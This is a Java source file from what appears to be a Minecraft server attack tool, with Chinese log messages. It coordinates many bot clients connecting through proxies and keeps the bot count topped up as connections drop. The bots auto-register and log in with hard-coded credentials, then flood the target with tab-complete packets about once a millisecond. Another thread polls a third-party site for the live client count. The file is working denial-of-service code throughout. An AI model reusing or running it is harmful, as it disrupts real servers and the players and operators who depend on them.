package me.alikomi.endminecraft.tasks.attack.utils;


import lombok.AllArgsConstructor;
import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.packetlib.Client;

import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;

@AllArgsConstructor
public class Attack_util extends Util {
    private DistributedAttack attack;
    private static int index = 0;

    public List<Thread> init() {
        attack.getIps().forEach((po, tp) -> {
            if (po.contains(":")) {
                attack.getConnects().put(po, attack.start(tp, po));
            }
        });
        List<Thread> li = new ArrayList<>();
        for (Client c : attack.getConnects().values()) {
            li.add(new Thread(() -> {
                c.getSession().setReadTimeout(5000);
                c.getSession().setWriteTimeout(3500);
                c.getSession().connect();
            }));
        }
        log("初始化完毕..正在启动");
        return li;
    }

    public void start(List<Thread> li) {
        li.forEach((t) -> {
            t.start();
            try {
                Thread.sleep(attack.getSleepTime());
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });
    }

    public void getPlayersThread() {

        new Thread(() -> {
            while (attack.isAttack()) {
                try {
                    log("            当前连接Client：" + getHttpReq("http://www.mckuai.com/fuzhuApply.do", "act=testIp&ip=" + attack.getIp(), "GBK"));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void clearThread() {
        new Thread(() -> {
            while (attack.isAttack()) {
                List<String> list = new ArrayList<>();
                attack.getConnects().forEach((k, v) -> {
                    if (v != null && v.getSession() != null) {
                        if (!v.getSession().isConnected()) {
                            list.add(k);
                        }
                    } else {
                        list.add(k);
                    }
                });
                log("清理了：" + list.size() + " 个线程");
                attack.getLock().lock();
                list.forEach((s -> attack.getConnects().remove(s)));
                attack.getLock().unlock();
                try {
                    Thread.sleep(2700);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void checkAddPlayersThread() {
        new Thread(() -> {
            while (attack.isAttack()) {
                try {
                    Thread.sleep(1500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                int con = attack.getConnects().size();
                int ipss = attack.getIps().size();
                log("当前Client： " + con + "最大Client： " + ipss);
                if (con < ipss) {
                    for (int i = 0; i < ipss - con; i++) {
                        if (index >= attack.getIpsKey().size() - 1) index = 0;
                        Proxy.Type tp = attack.getIps().get(attack.getIpsKey().get(index));
                        String po = attack.getIpsKey().get(index);

                        while (!po.contains(":")) {
                            index++;
                            if (index >= attack.getIpsKey().size() - 1) {
                                index = 0;
                                break;
                            }
                            tp = attack.getIps().get(attack.getIpsKey().get(index));
                            po = attack.getIpsKey().get(index);
                        }

                        while (attack.getConnects().containsKey(po)) {
                            index++;
                            if (index >= attack.getIpsKey().size() - 1) {
                                index = 0;
                                break;
                            }
                            tp = attack.getIps().get(attack.getIpsKey().get(index));
                            po = attack.getIpsKey().get(index);
                        }
                        if (!po.contains(":")) continue;
                        Client c = attack.start(tp, po);
                        index++;
                        attack.getLock().lock();
                        attack.getConnects().put(po, c);
                        attack.getLock().unlock();
                        new Thread(() -> {
                            c.getSession().setReadTimeout(5000);
                            c.getSession().setWriteTimeout(3500);
                            c.getSession().connect();
                        }).start();
                        try {
                            Thread.sleep(attack.getSleepTime());
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }).start();
    }

    public static void regAndLogin(Client client) {
        new Thread(() -> {
            client.getSession().send(new ClientChatPacket("/register qwqovo8898 qwqovo8898"));
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            client.getSession().send(new ClientChatPacket("/login qwqovo8898"));
        }).start();
    }

    public static void startTabAttack(Client client, DistributedAttack attack1) {
        log("开始发送TAB包");
        new Thread(() -> {
            while (attack1.isAttack()) {
                client.getSession().send(new ClientTabCompletePacket("/"));
                try {
                    Thread.sleep(1);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
